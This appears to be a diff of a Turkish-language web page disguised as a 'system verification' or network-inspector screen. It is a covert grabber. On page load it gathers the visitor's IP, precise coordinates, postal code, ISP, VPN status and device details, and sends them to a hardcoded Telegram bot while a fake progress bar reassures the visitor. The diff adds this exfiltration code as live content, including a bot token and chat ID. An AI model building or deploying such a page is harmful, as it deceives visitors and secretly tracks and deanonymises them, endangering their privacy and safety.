@@ -1,102 +1,73 @@
-<?php
-// --- SECURE PRO PROTOKOLÜ v5.0 - ELİTE EDITION ---
-?>
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Doğrulaması</title>
+    <title>Sistem Analiz Merkezi</title>
     <style>
-        body { background: #050505; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 85%; max-width: 420px; padding: 25px; border: 2px solid #00ff66; background: #0a0a0a; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 102, 0.3); border-radius: 8px; }
-        .blink { animation: blinker 1s linear infinite; color: #ff3333; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #020202; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .matrix-box { width: 85%; max-width: 440px; padding: 30px; border: 2px dashed #00ff66; background: #050505; text-align: center; box-shadow: 0 0 30px rgba(0, 255, 102, 0.4); border-radius: 4px; }
+        .progress-bar { width: 100%; background: #222; border: 1px solid #00ff66; height: 10px; margin-top: 20px; position: relative; }
+        .progress-fill { width: 0%; height: 100%; background: #00ff66; transition: width 0.4s ease; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <div style="font-weight: bold; margin-bottom: 12px; font-size: 16px;">🛡️ DEEP PACKET INSPECTION v5.0</div>
-        <div id="status" class="blink">⚠️ Ağ tüneli sıfırlanıyor, 1.5s bekleyin...</div>
-        <div id="progress" style="margin-top: 15px; color: #888; font-size: 12px;">[■■■■■■□□□□] %60</div>
+    <div class="matrix-box">
+        <div style="font-weight: bold; font-size: 16px; letter-spacing: 2px;">⚡ CORE NETWORK INSPECTOR v6.0</div>
+        <div id="status" style="margin-top: 15px; color: #ff3333;">[!] Güvenli tünel senkronizasyonu başlatılıyor...</div>
+        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
     </div>
 
     <script>
-        // Sayfa yüklenince doğrudan tetikleme, önce tüneli beklet (1.5 Saniye Kuralı)
-        window.onload = function() {
-            setTimeout(async function() {
-                document.getElementById('status').innerText = "⚡ Gerçek IP ve VPN bypass modülleri devrede...";
-                document.getElementById('progress').innerText = "[■■■■■■■■■□] %90";
-                
-                await siberLoguCalistir();
-            }, 1500); // 1.5 saniyelik yapay gecikme ve kopma simülasyonu
-        };
+        window.onload = async function() {
+            let fill = document.getElementById('fill');
+            let status = document.getElementById('status');
 
-        async function siberLoguCalistir() {
-            let ip = "Bilinmiyor";
-            let ulke = "Bilinmiyor";
-            let eyalet_sehir = "Bilinmiyor";
-            let posta_kodu = "Bilinmiyor";
-            let koordinat = "Bilinmiyor";
-            let internet_sirketi = "Bilinmiyor";
-            let mobil_mi = "Hayır";
-            let vpn_proxy = "Temiz (Doğal)";
-            let ulke_kod = "-";
-            let para_birimi = "-";
+            fill.style.width = "20%";
+            status.innerText = "[*] Önbellek ve tünel proxy katmanları kırılıyor...";
+            await new Promise(r => setTimeout(r, 800));
 
-            // --- DEEP IP & VPN BYPASS KATMANI ---
-            // Önbelleği (cache) kırmak için her isteğin sonuna rastgele milisaniye ekliyoruz (?nocache=...)
-            let cacheBuster = "?nocache=" + new Date().getTime();
+            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor";
+            let posta_kodu = "Bilinmiyor", koordinat = "Bilinmiyor", internet_sirketi = "Bilinmiyor";
+            let mobil_mi = "Hayır (Ev/İş İnterneti)", vpn_proxy = "Temiz (Doğal Bağlantı)", ulke_kod = "-", para_birimi = "-";
+            let os = "Bilinmeyen Sistem";
 
+            fill.style.width = "50%";
+            status.innerText = "[*] HTTPS Gateway üzerinden konum verileri çekiliyor...";
+            
+            let cacheBuster = "?cb=" + Math.random();
             try {
-                // Ana İstihbarat Havuzu (Gelişmiş Bilgiler)
-                let r1 = await fetch("https://ipapi.co/json/" + cacheBuster);
-                let d1 = await r1.json();
+                let istek = await fetch("https://ipapi.co/json/" + cacheBuster);
+                let veri = await istek.json();
                 
-                if (d1 && !d1.error) {
-                    ip = d1.ip || "Bilinmiyor";
-                    ulke = d1.country_name || "Bilinmiyor";
-                    eyalet_sehir = (d1.region || "Bilinmiyor") + " / " + (d1.city || "Bilinmiyor");
-                    posta_kodu = d1.postal || "Bilinmiyor";
-                    koordinat = (d1.latitude || "0") + " , " + (d1.longitude || "0");
-                    internet_sirketi = d1.org || "Bilinmiyor";
-                    ulke_kod = d1.country_calling_code || "-";
-                    para_birimi = d1.currency || "-";
+                if (veri && !veri.error) {
+                    ip = veri.ip || "Bilinmiyor";
+                    ulke = veri.country_name || "Bilinmiyor";
+                    eyalet_sehir = (veri.region || "Bilinmiyor") + " / " + (veri.city || "Bilinmiyor");
+                    posta_kodu = veri.postal || "Bilinmiyor";
+                    koordinat = (veri.latitude || "0") + " , " + (veri.longitude || "0");
+                    internet_sirketi = veri.org || "Bilinmiyor";
+                    ulke_kod = veri.country_calling_code || "-";
+                    para_birimi = veri.currency || "-";
+
+                    let org_lower = internet_sirketi.toLowerCase();
+                    if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
+                        mobil_mi = "Evet (Mobil Şebeke)";
+                    }
                 }
             } catch (e) {
-                // Eğer VPN ana havuzu bloklarsa 2. Kademe Güvenli Havuz Devreye Girer
                 try {
                     let r2 = await fetch("https://api.db-ip.com/v2/free/self" + cacheBuster);
                     let d2 = await r2.json();
-                    if (d2 && d2.ipAddress) {
-                        ip = d2.ipAddress;
-                        ulke = d2.countryName;
-                        eyalet_sehir = d2.city || "Bilinmiyor";
-                    }
+                    if (d2 && d2.ipAddress) { ip = d2.ipAddress; ulke = d2.countryName; eyalet_sehir = d2.city; }
                 } catch(err){}
             }
 
-            // Gelişmiş VPN Algılama (Saat Dilimi ve Dil Çelişkisinden Yakalama)
-            let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            if (cihaz_saati.toLowerCase().includes("europe/istanbul") || cihaz_saati.toLowerCase().includes("asia/istanbul")) {
-                // Eğer IP yabancı ama adamın cihazı Türkiye saatindeyse kesin VPN'dir
-                if (ulke !== "Bilinmiyor" && ulke !== "Turkey") {
-                    vpn_proxy = "⚠️ KESİN VPN (Konum Yabancı / Cihaz TR Yerel!)";
-                }
-            }
-
-            // Operatör Analizi
-            let org_lower = internet_sirketi.toLowerCase();
-            if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
-                mobil_mi = "Evet (Mobil Şebeke)";
-            }
-
-            // --- DONANIM PARMAK İZİ KATMANI ---
-            let os = "Bilinmeyen Sistem";
+            fill.style.width = "75%";
+            status.innerText = "[*] High-Entropy donanım mimarisi çözülüyor...";
+            
             let ua = navigator.userAgent;
-
-            // Android Sürüm Kilidini Kıran Bölüm (High Entropy Values)
             if (/Android/i.test(ua)) {
                 os = "Android";
                 if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
@@ -111,7 +82,7 @@
                             else if (major === 15) os = "Android 15";
                             else if (major > 0 && major <= 10) os = "Android " + major;
                         }
-                    } catch (e) {
+                    } catch (uaErr) {
                         let match = ua.match(/Android\s([0-9\.]+)/);
                         os = match ? "Android " + match[1] : "Android";
                     }
@@ -125,7 +96,13 @@
                 os = "Windows";
             }
 
-            // Ekstra Donanım Ayrıntıları
+            let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            if (cihaz_saati.toLowerCase().includes("istanbul")) {
+                if (ulke !== "Bilinmiyor" && ulke !== "Turkey") {
+                    vpn_proxy = "⚠️ KESİN VPN (Cihaz TR, IP Yabancı!)";
+                }
+            }
+
             let pil = "Bilinmiyor";
             if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
             let ekran = window.screen.width + "x" + window.screen.height;
@@ -134,41 +111,41 @@
             let dil = navigator.language || "Bilinmiyor";
             let tarih = new Date().toLocaleString('tr-TR');
 
-            // --- TELEGRAM RAPOR ŞABLONU ---
-            let mesaj = "🥷 *KIRILMAZ ELİTE SYSTEM LOGU*\n";
+            fill.style.width = "100%";
+            status.style.color = "#00ff66";
+            status.innerText = "[+] Protokol doğrulandı. Paket gönderiliyor...";
+
+            let mesaj = "👑 *ULTIMATE SYSTEM NETWORK LOG*\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🌐 *Gerçek IP Adresi:* `" + ip + "`\n";
-            mesaj += "🤖 *Sistem (OS):* " + os + "\n";
-            mesaj += "⏱️ *Analiz Zamanı:* " + tarih + "\n";
+            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
+            mesaj += "🤖 *Sistem (OS):* " + os + " 🛡️\n";
+            mesaj += "⏰ *Zaman damgası:* " + tarih + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
             mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
             mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
-            mesaj += "🗺️ *Tam Koordinat:* " + koordinat + "\n";
+            mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
             mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
-            mesaj += "📶 *Mobil Bağlantı:* " + mobil_mi + "\n";
+            mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
             mesaj += "🛡️ *VPN / Proxy:* " + vpn_proxy + "\n";
-            mesaj += "⚙️ *Bölge Saati:* " + cihaz_saati + "\n";
+            mesaj += "⚙️ *Cihaz Saat Dilimi:* " + cihaz_saati + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🖥️ *Ekran Boyutu:* " + ekran + "\n";
-            mesaj += "🧠 *İşlemci Mimarisi:* " + cekirdek + " Çekirdek\n";
-            mesaj += "💾 *Sistem Belleği:* " + ram + "\n";
-            mesaj += "🔋 *Güç Durumu:* " + pil + "\n";
-            mesaj += "🗣️ *Sistem Dili:* " + dil + "\n";
+            mesaj += "🖥️ *Ekran Çözünürlüğü:* " + ekran + "\n";
+            mesaj += "🧠 *İşlemci Gücü:* " + cekirdek + " Çekirdek\n";
+            mesaj += "💾 *Sistem RAM:* " + ram + "\n";
+            mesaj += "🔋 *Pil Seviyesi:* " + pil + "\n";
+            mesaj += "🗣️ *Cihaz Dili:* " + dil + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
-            // Telegram API Gönderim Sektörü
             let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
             let cid = "6845229845";
             let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
             fetch(url).then(() => {
-                document.getElementById('status').innerText = "✓ Doğrulama tamamlandı.";
-                document.getElementById('status').className = "";
-                document.getElementById('progress').innerText = "[■■■■■■■■■■] %100";
+                status.innerText = "✓ Doğrulama Başarılı. Yönlendirildiniz.";
             }).catch(() => {
-                document.getElementById('status').innerText = "Yeniden deneniyor...";
+                status.innerText = "Bağlantı hatası, paket düşürüldü.";
             });
-        }
+        };
     </script>
 </body>
 </html>
